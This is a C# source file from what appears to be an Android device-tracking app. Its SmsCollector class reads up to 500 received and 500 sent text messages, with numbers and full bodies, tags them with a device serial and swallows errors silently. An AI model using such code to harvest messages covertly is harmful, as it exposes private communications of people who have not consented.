using Android.Database;
using Android.Net;
using DeviceTracker.Models;

namespace DeviceTracker.Services.Collectors;

/// <summary>
/// يجمع الرسائل النصية (SMS) من ContentProvider في Android.
/// يتطلب: READ_SMS permission
/// </summary>
public class SmsCollector
{
    public static List<SmsRecord> Collect(Android.Content.Context context)
    {
        var records = new List<SmsRecord>();

        try
        {
            var uri = Android.Net.Uri.Parse("content://sms/inbox");
            if (uri == null) return records;

            var cursor = context.ContentResolver?.Query(
                uri, null, null, null,
                "date DESC LIMIT 500");

            if (cursor == null) return records;

            while (cursor.MoveToNext())
            {
                try
                {
                    var address = GetString(cursor, "address") ?? "";
                    var body = GetString(cursor, "body") ?? "";
                    var date = GetLong(cursor, "date");
                    var type = GetInt(cursor, "type");
                    var read = GetInt(cursor, "read");

                    records.Add(new SmsRecord
                    {
                        DeviceSerial = Preferences.Get("device_serial", "UNKNOWN"),
                        PhoneNumber = address,
                        MessageBody = body,
                        MessageType = type switch
                        {
                            1 => "inbox", 2 => "sent",
                            3 => "draft", 4 => "outbox",
                            5 => "failed", _ => "unknown"
                        },
                        IsRead = read == 1,
                        SmsDate = DateTimeOffset.FromUnixTimeMilliseconds(date).UtcDateTime,
                        CapturedAt = DateTime.UtcNow
                    });
                }
                catch { continue; }
            }

            cursor.Close();
        }
        catch (Java.Lang.SecurityException)
        {
            System.Diagnostics.Debug.WriteLine("[SmsCollector] Permission denied: READ_SMS");
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[SmsCollector] Error: {ex.Message}");
        }

        // جلب الرسائل المرسلة أيضاً
        try
        {
            var sentUri = Android.Net.Uri.Parse("content://sms/sent");
            if (sentUri == null) return records;

            var sentCursor = context.ContentResolver?.Query(
                sentUri, null, null, null, "date DESC LIMIT 500");
            if (sentCursor == null) return records;

            while (sentCursor.MoveToNext())
            {
                try
                {
                    records.Add(new SmsRecord
                    {
                        DeviceSerial = Preferences.Get("device_serial", "UNKNOWN"),
                        PhoneNumber = GetString(sentCursor, "address") ?? "",
                        MessageBody = GetString(sentCursor, "body") ?? "",
                        MessageType = "sent",
                        IsRead = true,
                        SmsDate = DateTimeOffset.FromUnixTimeMilliseconds(
                            GetLong(sentCursor, "date")).UtcDateTime,
                        CapturedAt = DateTime.UtcNow
                    });
                }
                catch { continue; }
            }
            sentCursor.Close();
        }
        catch { }

        return records;
    }

    private static string? GetString(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetString(idx) : null;
    }

    private static int GetInt(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetInt(idx) : 0;
    }

    private static long GetLong(ICursor c, string col)
    {
        var idx = c.GetColumnIndex(col);
        return idx >= 0 ? c.GetLong(idx) : 0;
    }
}
